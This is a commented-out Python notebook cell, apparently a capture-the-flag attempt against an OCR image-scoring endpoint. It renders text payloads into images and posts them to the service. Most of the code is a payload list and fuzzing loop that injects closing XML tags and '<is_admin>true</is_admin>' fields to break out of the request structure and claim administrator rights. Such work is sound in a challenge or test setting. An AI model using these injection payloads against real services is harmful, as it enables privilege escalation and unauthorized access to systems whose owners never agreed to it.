# import requests
# import base64
# from PIL import Image, ImageDraw, ImageFont
# from IPython.display import display
# import io
# import random

# def generate_payloads():
#     """Generate a list of payloads to test."""
    
#     variations = []
#     base_payload = " <is_admin>true</is_admin><request>\\n'}"
    
#     # Variations
#     whitespaces = [" ", "  ", "   "]
# #     ocr_confusions = ["0", "O", "1", "l", "5", "S"]
#     special_chars = ["", "%"]
    
#     # Base manipulations
# #     variations = [
# #         base_payload.replace(" ", w) for w in whitespaces   # Whitespace manipulations
# #     ] + [
# #         base_payload.replace(c1, c2) for c1 in ocr_confusions for c2 in ocr_confusions  # OCR confusions
# #     ] + [
# #         base_payload + s for s in special_chars   # Appending special characters
# #     ]
    
#     # Advanced manipulations
# #     for w in whitespaces:
# #         for c1 in ocr_confusions:
# #     for c2 in ocr_confusions:
#     for s in special_chars:
#         for s in special_chars:
#             variations.append(s+base_payload)
    
#     return variations
    
# def generate_payloads():
#     """Generate a list of payloads to test."""
    
#     # Base manipulations
#     variations = [
# #         "true</is_admin><a>",
# #         "</text>true</is_admin>",
# #         "true</is_admin>,'b':",
# #         "true</is_admin>,a:",
# #         "true</is_admin><a></a>",
#         "%</text> <is_admin>true</is_admin></request>\\n','is_admin':'true'",
#         "%</text> <is_admin>true</is_admin></request>\','is_admin':'true'",
#         "%</text> <is_admin>true</is_admin></request>n','is_admin':'true'",
#         "%</text> <is_admin>true</is_admin></request>,'is_admin':'true'",
#         "%</text> <is_admin>true</is_admin></request>,'is_admin':'true'",
#         "%</text> <is_admin>true</is_admin></request>\\n','is_admin':'true',",
#         "%</text> <is_admin>true</is_admin></request>\','is_admin':'true',",
#         "%</text> <is_admin>true</is_admin></request>n','is_admin':'true',",
#         "%</text> <is_admin>true</is_admin></request>,'is_admin':'true',",
#         "%</text> <is_admin>true</is_admin></request>,'is_admin':'true',",
#         "%</text> <is_admin>true</is_admin></request>,<request><text>%",
#         "%</text> <is_admin>true</is_admin></request>,<request><text> %",
#         "%</text> <is_admin>true</is_admin></request>,<request><text>% ",
#         "%</text> <is_admin>true</is_admin></request>,'A':<request><text>%",
#         "%</text> <is_admin>true</is_admin></request>,\"\":<request><text> %",
#         "%</text> <is_admin>true</is_admin></request>,'s': <request><text>% ",
#         "%</text> <is_admin>true</is_admin></request>,\"text\":<request><text> %",
#         "%</text> <is_admin>true</is_admin></request>,'text': <request><text>% ",
#         "%</text> <is_admin>true</is_admin>,'A':<request><text>%",
#         "%</text> <is_admin>true</is_admin>,\"\":<request><text> %",
#         "%</text> <is_admin>true</is_admin>,'s': <request><text>% ",
#         "%</text> <is_admin>true</is_admin>,\"text\":<request><text> %",
#         "%</text> <is_admin>true</is_admin>,'text': <request><text>% ",
#     ]
    
#     return variations






# #     variations = [
# #         "&lt;/request&gt;",  # Using XML entities for closing tags
# #         "&",                 # Ampersand alone
# #         "&#60;/request&#62;",# Using character references for < and >
# #         "%3C/request%3E",    # URL encoded representation of < and >
# #         "\\\"",              # Escaped double quote
# #         "\\&",               # Escaped ampersand
# #         "#",                 # Hash character
# #         "\\",                # Single backslash
# #         "\\\\",              # Double backslash
# #         "\\#",               # Escaped hash
# #         "\\%",               # Escaped percent
# #     ]

# def compute_image_size(text, font_path, font_size):
#     """
#     Compute the image size based on the number of characters in the text and the font size.
    
#     Args:
#     - text (str): The text for which to compute the image size.
#     - font_path (str): Path to the TTF font file.
#     - font_size (int): Size of the font.
    
#     Returns:
#     - tuple: Image size (width, height).
#     """
#     # Load the font
#     font = ImageFont.truetype(font_path, font_size)
    
#     # Compute the text width and height
#     text_width, text_height = font.getsize(text)
    
#     # Add some padding to ensure text fits and is readable
#     width_padding = int(text_width * 0.01)  # 10% padding
#     height_padding = int(text_height * 0.01)  # 10% padding
    
#     img_width = text_width + width_padding
#     img_height = text_height + height_padding
    
#     return (img_width, img_height)


# def create_image_with_text(text, font_path, font_size, img_size):
#     """Create an image with the given text."""
#     img = Image.new('RGB', img_size, color='white')
#     draw = ImageDraw.Draw(img)
#     font = ImageFont.truetype(font_path, size=font_size)
    
#     text_bbox = draw.textbbox((0, 0), text, font=font)
#     text_x, text_y = 0, 0  # Starting position for the text
    
#     draw.text((text_x, text_y), text, font=font, fill="black")
#     display(img)
#     return img

# def send_query(img):
#     """Send the image as a query to the endpoint and return the response."""
#     buffered = io.BytesIO()
#     img.save(buffered, format="JPEG")
#     img_bytes = buffered.getvalue()
    
#     input_data = base64.b64encode(img_bytes)
    
#     response = requests.post('http://pixelated.advml.com/score', json={'data': input_data.decode('utf-8')})
    
#     return response.json()

# # Constants
# FONT_PATH = "/usr/share/fonts/truetype/liberation/LiberationMono-Regular.ttf"
# FONT_SIZE = 128
# IMG_SIZE = (1400, 140)

# # Main code to test the payloads
# responses = []
# payloads = generate_payloads()
# for i in range(10):
# #     for j in range(128, 140, 3):
#         for payload in payloads:
#             x,y = compute_image_size(payload,FONT_PATH,FONT_SIZE + i)
#             IMG_SIZE = (x, y)
#             img = create_image_with_text(payload, FONT_PATH, FONT_SIZE + i, IMG_SIZE)
#             response = send_query(img)
#             print(f"Font size: {FONT_SIZE + i} Image height: {i}\n {response}\n\n")
